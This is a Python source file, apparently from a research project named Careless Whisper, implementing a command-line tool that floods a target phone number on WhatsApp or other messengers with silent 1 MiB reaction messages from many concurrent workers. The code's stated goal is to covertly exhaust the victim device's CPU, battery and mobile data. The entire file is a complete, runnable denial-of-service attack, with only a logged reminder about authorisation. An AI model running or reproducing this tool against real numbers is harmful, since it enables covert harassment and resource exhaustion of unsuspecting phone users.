import asyncio
import logging
import sys
import time
from argparse import ArgumentParser
from dataclasses import dataclass, field
from logging import getLogger

from carelesswhisper.messengers.base import BaseMessenger
from carelesswhisper.tools.util import confirm_number, get_messenger

from .config import Settings

logger = getLogger(__name__)

BYTES_PER_GIB = 1024**3


@dataclass
class FloodStats:
    """Running totals for an in-progress flood."""

    sent: int = 0
    failed: int = 0
    started_at: float = field(default_factory=time.monotonic)

    def elapsed(self) -> float:
        return max(time.monotonic() - self.started_at, 1e-9)

    def rate(self) -> float:
        """Messages sent per second since the flood started."""
        return self.sent / self.elapsed()

    def estimated_gib(self, bytes_per_message: int) -> float:
        return (self.sent * bytes_per_message) / BYTES_PER_GIB


def build_payload(size_bytes: int) -> str:
    """Returns an ASCII reaction string of the requested byte size.

    The reaction content is encoded as UTF-8 before transmission, so an ASCII
    string of length N produces an N-byte payload.
    """
    if size_bytes <= 0:
        raise ValueError("payload size must be positive")
    return "A" * size_bytes


def _should_continue(stats: FloodStats, settings: Settings) -> bool:
    if settings.max_messages is not None and stats.sent >= settings.max_messages:
        return False
    if settings.duration is not None and stats.elapsed() >= settings.duration:
        return False
    return True


async def flood(
    messenger: BaseMessenger,
    settings: Settings,
    stats: FloodStats | None = None,
) -> FloodStats:
    """
    Floods the target with silent reaction messages until a stop condition is hit.

    Each worker repeatedly sends a silent message. The same mechanism that the
    fingerprint tool uses to trigger a single delivery receipt is driven here at
    high concurrency to exhaust the target device's CPU, battery, and mobile
    data. No receipts are tracked; the goal is sustained send throughput.
    """
    stats = stats or FloodStats()
    running = True

    await confirm_number(
        settings.phone_number,
        messenger,
        settings.ignore_unregistered_warning,
    )

    # Build the oversized reaction payload once and reuse it for every send.
    payload = build_payload(settings.payload_size)

    logger.warning(
        "Starting DoS flood against %s with %d workers (delay %.3fs, "
        "%.2f MiB payload). Only use this against devices you are authorised "
        "to test.",
        settings.phone_number,
        settings.concurrent_requests,
        settings.delay_between_requests,
        settings.payload_size / (1024 * 1024),
    )

    async def worker() -> None:
        while running and _should_continue(stats, settings):
            try:
                await messenger.send_silent_message(
                    settings.phone_number, reaction=payload
                )
            except (
                Exception
            ) as exc:  # noqa: BLE001 - keep flooding despite transient errors
                stats.failed += 1
                logger.debug("Silent message failed: %s", exc)
                continue

            stats.sent += 1
            if settings.delay_between_requests > 0:
                await asyncio.sleep(settings.delay_between_requests)

    async def reporter() -> None:
        while running and _should_continue(stats, settings):
            await asyncio.sleep(settings.report_interval)
            logger.info(
                "Flood progress: %d sent, %d failed, %.1f msg/s, ~%.3f GiB est. on target",
                stats.sent,
                stats.failed,
                stats.rate(),
                stats.estimated_gib(settings.payload_size),
            )

    workers = [
        asyncio.create_task(worker()) for _ in range(settings.concurrent_requests)
    ]
    reporter_task = asyncio.create_task(reporter())

    try:
        await asyncio.gather(*workers)
    finally:
        running = False
        reporter_task.cancel()
        await asyncio.gather(reporter_task, return_exceptions=True)

    logger.info(
        "Flood finished: %d sent, %d failed over %.1fs (%.1f msg/s, ~%.3f GiB est.)",
        stats.sent,
        stats.failed,
        stats.elapsed(),
        stats.rate(),
        stats.estimated_gib(settings.payload_size),
    )
    return stats


async def _noop_delivery(_msg_id: str) -> None:
    """The DoS tool does not track delivery receipts."""
    return None


async def _connect_and_run(settings: Settings) -> FloodStats:
    messenger = await get_messenger(settings.provider, _noop_delivery)

    logger.info("Starting messenger connection...")
    # start() only spawns the messenger's background thread and returns once
    # setup is scheduled, so it must not be raced against the flood. Doing so
    # resolved immediately and tore the flood down before it could send.
    await messenger.start()

    logger.info("Waiting for messenger to be ready...")
    await messenger.wait_until_ready()
    logger.info("Messenger is ready!")

    flood_task = asyncio.create_task(flood(messenger, settings))

    try:
        return await flood_task
    finally:
        if not flood_task.done():
            flood_task.cancel()
            await asyncio.gather(flood_task, return_exceptions=True)
        await messenger.stop()


async def run(settings: Settings) -> None:
    """Async entry point for the DoS tool."""
    logger.info(f"Loaded settings for phone number: {settings.phone_number}")
    logger.info(f"Provider: {settings.provider}")
    await _connect_and_run(settings)


def _build_parser() -> ArgumentParser:
    parser = ArgumentParser(
        description="Careless Whisper - Denial of Service (silent message flood) Tool",
        prog="cw-dos",
    )
    parser.add_argument(
        "--phone-number",
        "-p",
        type=str,
        required=True,
        help="Target phone number to flood",
    )
    parser.add_argument(
        "--provider",
        type=str,
        default="whatsapp",
        help="Messenger provider to use (default: whatsapp)",
    )
    parser.add_argument(
        "--concurrent",
        type=int,
        default=10,
        help="Number of concurrent flood workers (default: 10)",
    )
    parser.add_argument(
        "--delay",
        type=float,
        default=0.0,
        help="Delay between messages per worker in seconds (default: 0.0)",
    )
    parser.add_argument(
        "--duration",
        type=float,
        default=None,
        help="Stop after this many seconds (default: run until interrupted)",
    )
    parser.add_argument(
        "--max-messages",
        type=int,
        default=None,
        help="Stop after sending this many messages (default: unlimited)",
    )
    parser.add_argument(
        "--payload-size",
        type=int,
        default=1024 * 1024,
        help="Size in bytes of each reaction payload (default: 1048576 = 1 MiB)",
    )
    parser.add_argument(
        "--report-interval",
        type=float,
        default=5.0,
        help="How often to log flood progress in seconds (default: 5.0)",
    )
    parser.add_argument(
        "--ignore-unregistered",
        action="store_true",
        help="Ignore warning for unregistered phone numbers",
    )
    parser.add_argument(
        "--log-level",
        type=str,
        default="INFO",
        choices=["DEBUG", "INFO", "WARNING", "ERROR", "CRITICAL"],
        help="Logging level (default: INFO)",
    )
    return parser


def main() -> None:
    """Console entry point for the DoS tool."""
    args = _build_parser().parse_args()

    logging.basicConfig(
        level=getattr(logging, args.log_level),
        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    )

    try:
        settings = Settings(
            **{
                "phone_number": args.phone_number,
                "provider": args.provider,
                "concurrent_requests": args.concurrent,
                "delay_between_requests": args.delay,
                "duration": args.duration,
                "max_messages": args.max_messages,
                "payload_size": args.payload_size,
                "report_interval": args.report_interval,
                "ignore_unregistered_warning": args.ignore_unregistered,
            }
        )
    except Exception as e:
        logger.error(f"Error creating settings: {e}")
        sys.exit(1)

    try:
        asyncio.run(run(settings=settings))
    except KeyboardInterrupt:
        logger.info("DoS tool terminated by user.")
        print("\nGoodbye!")
        sys.exit(0)
    except Exception as e:
        logger.error(f"Fatal error: {e}", exc_info=True)
        sys.exit(1)


if __name__ == "__main__":
    main()
